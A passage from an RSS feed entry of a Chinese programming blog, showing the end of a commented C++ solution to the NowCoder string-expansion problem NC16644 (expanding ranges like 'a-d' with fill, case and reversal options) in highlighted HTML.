class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//p引用了字符串，不要直接用带const的p，因此创建一个ans作为return的答案</span></span><br><span class="line">    string ans=p;</span><br><span class="line">    <span class="comment">//遍历原字符串</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;ans.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">        <span class="comment">//如果当前字符是&#x27;-&#x27;且前后类型相同，且后者比前者大</span></span><br><span class="line">        <span class="keyword">if</span>(ans[i]==<span class="string">&#x27;-&#x27;</span>&amp;&amp;<span class="built_in">isok</span>(ans[i<span class="number">-1</span>],ans[i+<span class="number">1</span>])&amp;&amp;ans[i<span class="number">-1</span>]&lt;ans[i+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="comment">//x临时存储原字符串中&#x27;-&#x27;左边字符</span></span><br><span class="line">            <span class="type">char</span> x=ans[i<span class="number">-1</span>];</span><br><span class="line">            <span class="comment">//初始化r（r包括&#x27;-&#x27;左右的元素）</span></span><br><span class="line">            r=r+x;x++;</span><br><span class="line">            <span class="comment">//如果当前元素不是&#x27;-&#x27;右边元素，进行操作</span></span><br><span class="line">            <span class="keyword">while</span>(x!=ans[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="comment">//变量k临时存储p2，作用还有用于while()的计数</span></span><br><span class="line">                <span class="type">int</span> k=p2;</span><br><span class="line">                <span class="comment">//三种情况不同处理，其中注意toupper()返回int值所以要转化为char</span></span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">1</span>)&#123;<span class="keyword">while</span>(k--) r=r+x;x++;&#125;</span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">2</span>)&#123;<span class="keyword">while</span>(k--) r=r+<span class="built_in">char</span>(<span class="built_in">toupper</span>(x));x++;&#125;</span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">3</span>)&#123;<span class="keyword">while</span>(k--) r=r+<span class="string">&#x27;*&#x27;</span>;x++;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//翻转函数，注意下标</span></span><br><span class="line">            <span class="keyword">if</span>(p3==<span class="number">2</span>)&#123;<span class="built_in">reverse</span>(r.<span class="built_in">begin</span>()+<span class="number">1</span>,r.<span class="built_in">end</span>());&#125;</span><br><span class="line">            <span class="comment">//将ans的&#x27;x-x&#x27;用r取代，</span></span><br><span class="line">            <span class="comment">//遍历变量i向前退一格，来到r的头部,以防出界，</span></span><br><span class="line">            <span class="comment">//并且清空临时存储r，</span></span><br><span class="line">            ans.<span class="built_in">replace</span>(i<span class="number">-1</span>,<span class="number">2</span>,r); i--;r=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>欢迎提问和交流</strong></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
